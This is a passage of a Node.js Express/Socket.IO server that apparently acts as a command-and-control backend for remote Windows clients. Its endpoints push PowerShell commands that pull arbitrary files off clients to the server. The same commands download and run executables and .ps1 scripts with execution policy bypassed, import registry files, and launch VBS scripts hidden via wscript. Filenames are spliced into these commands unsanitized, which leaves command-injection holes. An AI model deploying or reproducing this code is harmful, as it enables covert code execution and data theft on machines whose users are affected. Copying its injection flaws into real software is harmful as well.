  });

  res.json({ 
    message: `Directory listing request sent to ${client.hostname}`,
    requestId: requestId
  });
});

// File Explorer - Download file from client
app.post('/api/download-file/:clientId', (req, res) => {
  const { clientId } = req.params;
  const { filePath } = req.body;

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const requestId = uuidv4();
  const filename = path.basename(filePath);
  const uploadUrl = `http://${req.get('host')}/api/receive-file/${requestId}`;
  
  // PowerShell command to upload file to server
  const command = `powershell -Command "Invoke-WebRequest -Uri '${uploadUrl}' -Method POST -InFile '${filePath}'"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId: requestId,
    options: {
      timeout: 120000,
      workingDirectory: null
    }
  });

  res.json({ 
    message: `File download request sent to ${client.hostname}`,
    requestId: requestId,
    filename: filename
  });
});

// Receive file from client
app.post('/api/receive-file/:requestId', upload.single('file'), (req, res) => {
  const { requestId } = req.params;
  
  if (req.file) {
    res.json({ message: 'File received successfully', filename: req.file.filename });
  } else {
    res.status(400).json({ error: 'No file received' });
  }
});

// File Explorer - Upload file to client
app.post('/api/upload-to-client/:clientId', upload.single('file'), (req, res) => {
  const { clientId } = req.params;
  const { targetPath } = req.body;

  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const fileUrl = `http://${req.get('host')}/uploads/${req.file.filename}`;
  const fullTargetPath = path.join(targetPath, req.file.originalname).replace(/\\/g, '\\\\');
  
  // PowerShell command to download file from server to client
  const command = `powershell -Command "Invoke-WebRequest -Uri '${fileUrl}' -OutFile '${fullTargetPath}'"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: {
      timeout: 120000,
      workingDirectory: null
    }
  });

  res.json({ 
    message: `File upload command sent to ${client.hostname}`,
    commandId: commandId,
    filename: req.file.originalname
  });
});

// Execute VBS from library (existing file)
app.post('/api/execute-vbs-library/:clientId/:filename', (req, res) => {
  const { clientId, filename } = req.params;
  const filePath = path.join('uploads', filename);
  
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'VBS file not found' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const vbsUrl = `http://${req.get('host')}/uploads/${filename}`;
  
  // PowerShell command to check if file exists, download only if needed, then execute VBS script
  const command = `powershell -Command "$vbsDir = 'C:\\scripts'; if (-not (Test-Path $vbsDir)) { New-Item -ItemType Directory -Path $vbsDir -Force | Out-Null }; $vbsPath = Join-Path $vbsDir '${filename}'; if (-not (Test-Path $vbsPath)) { Invoke-WebRequest -Uri '${vbsUrl}' -OutFile $vbsPath }; Start-Process 'wscript.exe' -ArgumentList ('//B', $vbsPath) -WindowStyle Hidden"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: {
      timeout: 60000,
      workingDirectory: null
    }
  });

  res.json({ 
    message: `VBS script execution command sent to ${client.hostname}`,
    commandId: commandId,
    filename: filename
  });
});

// Play audio from library (existing file)
app.post('/api/play-audio-library/:clientId/:filename', (req, res) => {
  const { clientId, filename } = req.params;
  const filePath = path.join('uploads', filename);
  
  // Check if file exists
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'Audio file not found' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const audioUrl = `http://${req.get('host')}/uploads/${filename}`;
  
  // PowerShell command to check if file exists, download only if needed, then play audio
  const command = `powershell -Command "$audioDir = 'C:\\audios'; if (-not (Test-Path $audioDir)) { New-Item -ItemType Directory -Path $audioDir -Force | Out-Null }; $audioPath = Join-Path $audioDir '${filename}'; if (-not (Test-Path $audioPath)) { Invoke-WebRequest -Uri '${audioUrl}' -OutFile $audioPath }; $player = New-Object System.Media.SoundPlayer($audioPath); $player.PlaySync()"`;
  
  // Send command to client via existing executeCommand mechanism
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: {
      timeout: 60000,
      workingDirectory: null
    }
  });

  res.json({ 
    message: `Audio playback command sent to ${client.hostname}`,
    commandId: commandId,
    filename: filename
  });
});

// Get list of uploaded video files
app.get('/api/video-files', (req, res) => {
  try {
    const files = fs.readdirSync('uploads/')
      .filter(file => {
        const ext = file.toLowerCase();
        return ext.endsWith('.mp4') || ext.endsWith('.avi') || ext.endsWith('.mkv') || ext.endsWith('.webm');
      })
      .map(file => {
        const stats = fs.statSync(path.join('uploads', file));
        return {
          filename: file,
          size: stats.size,
          uploadedAt: stats.mtime
        };
      })
      .sort((a, b) => b.uploadedAt - a.uploadedAt);
    
    res.json(files);
  } catch (error) {
    res.status(500).json({ error: 'Failed to read video files' });
  }
});

// Delete a video file
app.delete('/api/video-files/:filename', (req, res) => {
  const { filename } = req.params;
  const filePath = path.join('uploads', filename);
  
  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      res.json({ message: `File ${filename} deleted successfully` });
    } else {
      res.status(404).json({ error: 'File not found' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete file' });
  }
});

// Video playback endpoint (upload new file)
app.post('/api/play-video/:clientId', uploadVideo.single('videoFile'), (req, res) => {
  const { clientId } = req.params;

  if (!req.file) {
    return res.status(400).json({ error: 'No video file uploaded' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const videoUrl = `http://${req.get('host')}/uploads/${req.file.filename}`;
  const filename = req.file.filename;
  
  // PowerShell command to check if file exists, download only if needed, then play video
  const command = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $videoDir = 'C:\\videos'; if (-not (Test-Path $videoDir)) { New-Item -ItemType Directory -Path $videoDir -Force | Out-Null }; $videoPath = Join-Path $videoDir '${filename}'; if (-not (Test-Path $videoPath)) { Invoke-WebRequest -Uri '${videoUrl}' -OutFile $videoPath }; Start-Process $videoPath"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: {
      timeout: 120000,
      workingDirectory: null
    }
  });

  res.json({ 
    message: `Video playback command sent to ${client.hostname}`,
    commandId: commandId,
    filename: req.file.originalname
  });
});

// Play video from library (existing file)
app.post('/api/play-video-library/:clientId/:filename', (req, res) => {
  const { clientId, filename } = req.params;
  const filePath = path.join('uploads', filename);
  
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'Video file not found' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const videoUrl = `http://${req.get('host')}/uploads/${filename}`;
  
  // PowerShell command to check if file exists, download only if needed, then play video
  const command = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $videoDir = 'C:\\videos'; if (-not (Test-Path $videoDir)) { New-Item -ItemType Directory -Path $videoDir -Force | Out-Null }; $videoPath = Join-Path $videoDir '${filename}'; if (-not (Test-Path $videoPath)) { Invoke-WebRequest -Uri '${videoUrl}' -OutFile $videoPath }; Start-Process $videoPath"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: {
      timeout: 120000,
      workingDirectory: null
    }
  });

  res.json({ 
    message: `Video playback command sent to ${client.hostname}`,
    commandId: commandId,
    filename: filename
  });
});

// Get list of uploaded general files
app.get('/api/general-files', (req, res) => {
  try {
    const files = fs.readdirSync('uploads/')
      .filter(file => {
        const ext = file.toLowerCase();
        // Exclude audio, vbs, and video files (already handled by other endpoints)
        return !ext.endsWith('.wav') && !ext.endsWith('.vbs') && 
               !ext.endsWith('.mp4') && !ext.endsWith('.avi') && 
               !ext.endsWith('.mkv') && !ext.endsWith('.webm') &&
               !ext.endsWith('.jpg') && !ext.endsWith('.jpeg') && !ext.endsWith('.png');
      })
      .map(file => {
        const stats = fs.statSync(path.join('uploads', file));
        const ext = path.extname(file).toLowerCase();
        return {
          filename: file,
          extension: ext,
          size: stats.size,
          uploadedAt: stats.mtime
        };
      })
      .sort((a, b) => b.uploadedAt - a.uploadedAt);
    
    res.json(files);
  } catch (error) {
    res.status(500).json({ error: 'Failed to read general files' });
  }
});

// Delete a general file
app.delete('/api/general-files/:filename', (req, res) => {
  const { filename } = req.params;
  const filePath = path.join('uploads', filename);
  
  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      res.json({ message: `File ${filename} deleted successfully` });
    } else {
      res.status(404).json({ error: 'File not found' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete file' });
  }
});

// Execute general file endpoint (upload new file)
app.post('/api/execute-file/:clientId', uploadGeneral.single('file'), (req, res) => {
  const { clientId } = req.params;

  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const fileUrl = `http://${req.get('host')}/uploads/${req.file.filename}`;
  const filename = req.file.filename;
  const ext = path.extname(filename).toLowerCase();
  
  // Build command based on file extension with file existence check
  let command;
  if (ext === '.exe' || ext === '.com' || ext === '.bat' || ext === '.cmd') {
    // Executable files - check if exists, download only if needed, then run
    command = `powershell -Command "$fileDir = 'C:\\temp_exec'; if (-not (Test-Path $fileDir)) { New-Item -ItemType Directory -Path $fileDir -Force | Out-Null }; $filePath = Join-Path $fileDir '${filename}'; if (-not (Test-Path $filePath)) { Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath }; Start-Process $filePath"`;
  } else if (ext === '.ps1') {
    // PowerShell script
    command = `powershell -Command "$fileDir = 'C:\\temp_exec'; if (-not (Test-Path $fileDir)) { New-Item -ItemType Directory -Path $fileDir -Force | Out-Null }; $filePath = Join-Path $fileDir '${filename}'; if (-not (Test-Path $filePath)) { Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath }; powershell.exe -ExecutionPolicy Bypass -File $filePath"`;
  } else if (ext === '.reg') {
    // Registry file
    command = `powershell -Command "$fileDir = 'C:\\temp_exec'; if (-not (Test-Path $fileDir)) { New-Item -ItemType Directory -Path $fileDir -Force | Out-Null }; $filePath = Join-Path $fileDir '${filename}'; if (-not (Test-Path $filePath)) { Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath }; reg import $filePath"`;
  } else {
    // Other files - check if exists, download only if needed, then open
    command = `powershell -Command "$fileDir = 'C:\\temp_exec'; if (-not (Test-Path $fileDir)) { New-Item -ItemType Directory -Path $fileDir -Force | Out-Null }; $filePath = Join-Path $fileDir '${filename}'; if (-not (Test-Path $filePath)) { Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath }; Start-Process $filePath"`;
  }
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: {
      timeout: 120000,
      workingDirectory: null
    }
  });

  res.json({ 
    message: `File execution command sent to ${client.hostname}`,
    commandId: commandId,
    filename: req.file.originalname
  });
});

// Execute general file from library (existing file)
app.post('/api/execute-file-library/:clientId/:filename', (req, res) => {
  const { clientId, filename } = req.params;
  const filePath = path.join('uploads', filename);
  
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'File not found' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const fileUrl = `http://${req.get('host')}/uploads/${filename}`;
  const ext = path.extname(filename).toLowerCase();
  
  // Build command based on file extension with file existence check
  let command;
  if (ext === '.exe' || ext === '.com' || ext === '.bat' || ext === '.cmd') {
    command = `powershell -Command "$fileDir = 'C:\\temp_exec'; if (-not (Test-Path $fileDir)) { New-Item -ItemType Directory -Path $fileDir -Force | Out-Null }; $filePath = Join-Path $fileDir '${filename}'; if (-not (Test-Path $filePath)) { Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath }; Start-Process $filePath"`;
  } else if (ext === '.ps1') {
    command = `powershell -Command "$fileDir = 'C:\\temp_exec'; if (-not (Test-Path $fileDir)) { New-Item -ItemType Directory -Path $fileDir -Force | Out-Null }; $filePath = Join-Path $fileDir '${filename}'; if (-not (Test-Path $filePath)) { Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath }; powershell.exe -ExecutionPolicy Bypass -File $filePath"`;
  } else if (ext === '.reg') {
    command = `powershell -Command "$fileDir = 'C:\\temp_exec'; if (-not (Test-Path $fileDir)) { New-Item -ItemType Directory -Path $fileDir -Force | Out-Null }; $filePath = Join-Path $fileDir '${filename}'; if (-not (Test-Path $filePath)) { Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath }; reg import $filePath"`;
  } else {
    command = `powershell -Command "$fileDir = 'C:\\temp_exec'; if (-not (Test-Path $fileDir)) { New-Item -ItemType Directory -Path $fileDir -Force | Out-Null }; $filePath = Join-Path $fileDir '${filename}'; if (-not (Test-Path $filePath)) { Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath }; Start-Process $filePath"`;
  }
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: {
      timeout: 120000,
      workingDirectory: null
    }
  });

  res.json({ 
    message: `File execution command sent to ${client.hostname}`,
    commandId: commandId,
    filename: filename
  });
});

// ========== DUMP ENDPOINTS (Save without execution) ==========

// Dump audio file to C:\audios
app.post('/api/dump-audio/:clientId', upload.single('file'), (req, res) => {
  const { clientId } = req.params;

  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const fileUrl = `http://${req.get('host')}/uploads/${req.file.filename}`;
  const filename = req.file.originalname;
  
  const command = `powershell -Command "$dir = 'C:\\audios'; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }; $filePath = Join-Path $dir '${filename}'; Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: { timeout: 120000 }
  });

  res.json({ 
    message: `File dumped to C:\\audios`,
    hostname: client.hostname,
    filename: req.file.originalname
  });
});

// Dump VBS file to C:\scripts
app.post('/api/dump-vbs/:clientId', uploadVbs.single('file'), (req, res) => {
  const { clientId } = req.params;

  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const fileUrl = `http://${req.get('host')}/uploads/${req.file.filename}`;
  const filename = req.file.originalname;
  
  const command = `powershell -Command "$dir = 'C:\\scripts'; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }; $filePath = Join-Path $dir '${filename}'; Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: { timeout: 120000 }
  });

  res.json({ 
    message: `File dumped to C:\\scripts`,
    hostname: client.hostname,
    filename: req.file.originalname
  });
});

// Dump video file to C:\videos
app.post('/api/dump-video/:clientId', uploadVideo.single('file'), (req, res) => {
  const { clientId } = req.params;

  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const fileUrl = `http://${req.get('host')}/uploads/${req.file.filename}`;
  const filename = req.file.originalname;
  
  const command = `powershell -Command "$dir = 'C:\\videos'; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }; $filePath = Join-Path $dir '${filename}'; Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: { timeout: 120000 }
  });

  res.json({ 
    message: `File dumped to C:\\videos`,
    hostname: client.hostname,
    filename: req.file.originalname
  });
});

// Dump general file to C:\files
app.post('/api/dump-file/:clientId', uploadGeneral.single('file'), (req, res) => {
  const { clientId } = req.params;

  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const fileUrl = `http://${req.get('host')}/uploads/${req.file.filename}`;
  const filename = req.file.originalname;
  
  const command = `powershell -Command "$dir = 'C:\\files'; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }; $filePath = Join-Path $dir '${filename}'; Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: { timeout: 120000 }
  });

  res.json({ 
    message: `File dumped to C:\\files`,
    hostname: client.hostname,
    filename: req.file.originalname
  });
});

// Dump photo file to C:\photos
app.post('/api/dump-photo/:clientId', uploadPhoto.single('file'), (req, res) => {
  const { clientId } = req.params;

  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const fileUrl = `http://${req.get('host')}/uploads/${req.file.filename}`;
  const filename = req.file.originalname;
  
  const command = `powershell -Command "$dir = 'C:\\photos'; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }; $filePath = Join-Path $dir '${filename}'; Invoke-WebRequest -Uri '${fileUrl}' -OutFile $filePath"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: { timeout: 120000 }
  });

  res.json({ 
    message: `File dumped to C:\\photos`,
    hostname: client.hostname,
    filename: req.file.originalname
  });
});

// ========== PHOTO ENDPOINTS ==========

// Upload and display photo
app.post('/api/play-photo/:clientId', uploadPhoto.single('photoFile'), (req, res) => {
  const { clientId } = req.params;
  
  if (!req.file) {
    return res.status(400).json({ error: 'No photo uploaded' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    fs.unlinkSync(req.file.path);
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const photoUrl = `http://${req.get('host')}/uploads/${req.file.filename}`;
  const filename = req.file.filename;
  
  const command = `powershell -Command "$dir = 'C:\\photos'; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }; $filePath = Join-Path $dir '${filename}'; if (-not (Test-Path $filePath)) { Invoke-WebRequest -Uri '${photoUrl}' -OutFile $filePath }; Start-Process $filePath"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: { timeout: 60000 }
  });

  res.json({ 
    message: `Photo opened on ${client.hostname}`,
    commandId: commandId,
    filename: req.file.originalname
  });
});

// Get photo library files
app.get('/api/photo-files', (req, res) => {
  const uploadsDir = 'uploads';
  const photoExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'];
  
  fs.readdir(uploadsDir, (err, files) => {
    if (err) {
      return res.status(500).json({ error: 'Failed to read directory' });
    }
    
    const photoFiles = files
      .filter(file => photoExtensions.some(ext => file.toLowerCase().endsWith(ext)))
      .map(file => {
        const filePath = path.join(uploadsDir, file);
        const stats = fs.statSync(filePath);
        return {
          filename: file,
          size: stats.size,
          extension: path.extname(file),
          uploadedAt: stats.mtime
        };
      })
      .sort((a, b) => b.uploadedAt - a.uploadedAt);
    
    res.json(photoFiles);
  });
});

// Play photo from library
app.post('/api/play-photo-library/:clientId/:filename', (req, res) => {
  const { clientId, filename } = req.params;
  const filePath = path.join('uploads', filename);
  
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'Photo not found' });
  }

  const client = connectedClients.get(clientId);
  if (!client || !client.connected) {
    return res.status(404).json({ error: 'Client not found or not connected' });
  }

  const commandId = uuidv4();
  const photoUrl = `http://${req.get('host')}/uploads/${filename}`;
  
  const command = `powershell -Command "$dir = 'C:\\photos'; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }; $filePath = Join-Path $dir '${filename}'; if (-not (Test-Path $filePath)) { Invoke-WebRequest -Uri '${photoUrl}' -OutFile $filePath }; Start-Process $filePath"`;
  
  client.socket.emit('executeCommand', {
    command,
    commandId,
    options: { timeout: 60000 }
  });

  res.json({ 
    message: `Photo opened on ${client.hostname}`,
    commandId: commandId,
    filename: filename
  });
});

// Delete photo from library
app.delete('/api/photo-files/:filename', (req, res) => {
  const { filename } = req.params;
  const filePath = path.join('uploads', filename);
  
  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'Photo not found' });
  }
  
  try {
    fs.unlinkSync(filePath);
    res.json({ message: 'Photo deleted successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete photo' });
  }
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  socket.on('register', (data) => {
    // Check if hostname is blocked
    if (isBlocked(data.hostname)) {
      console.log(`❌ Blocked client attempted to connect: ${data.hostname}`);
      socket.emit('blocked', { reason: 'Your computer has been blocked by the administrator' });
      socket.disconnect();
      return;
    }
    
    // Use client-provided ID if it starts with "client", otherwise generate UUID
    const clientId = (data.clientId && data.clientId.startsWith('client')) ? data.clientId : uuidv4();
    const clientInfo = {
      id: clientId,
      socket: socket,
      hostname: data.hostname,
      ip: data.ip || socket.handshake.address,
      connected: true,
      lastSeen: new Date(),
      socketId: socket.id
    };

    connectedClients.set(clientId, clientInfo);
    socket.clientId = clientId;

    // Send client ID back
    socket.emit('registered', { clientId });

    // Broadcast updated client list to dashboard
    io.emit('clientsUpdated', Array.from(connectedClients.values()).map(client => ({
      id: client.id,
      hostname: client.hostname,
      ip: client.ip,
      connected: client.connected,
      lastSeen: client.lastSeen
    })));
  });

  socket.on('heartbeat', () => {
    if (socket.clientId) {
      const client = connectedClients.get(socket.clientId);
      if (client) {
        client.lastSeen = new Date();
      }
    }
  });

  socket.on('commandResult', (data) => {
    // Broadcast result to dashboard
    io.emit('commandResult', {
      clientId: socket.clientId,
      ...data
    });
  });

  // Handle system info results
  socket.on('systemInfoResult', (data) => {
    io.emit('systemInfoResult', {
      clientId: socket.clientId,
      ...data
    });
  });

  // Handle process list results
  socket.on('processListResult', (data) => {
    io.emit('processListResult', {
      clientId: socket.clientId,
      ...data
    });
  });

  socket.on('disconnect', () => {
    if (socket.clientId) {
      const client = connectedClients.get(socket.clientId);
      if (client) {
        client.connected = false;
        client.lastSeen = new Date();
      }

      // Broadcast updated client list
      io.emit('clientsUpdated', Array.from(connectedClients.values()).map(client => ({
        id: client.id,
        hostname: client.hostname,
        ip: client.ip,
        connected: client.connected,
        lastSeen: client.lastSeen
      })));
    }
  });
});

const PORT = process.env.PORT || 8000;
server.listen(PORT, '0.0.0.0', () => {
});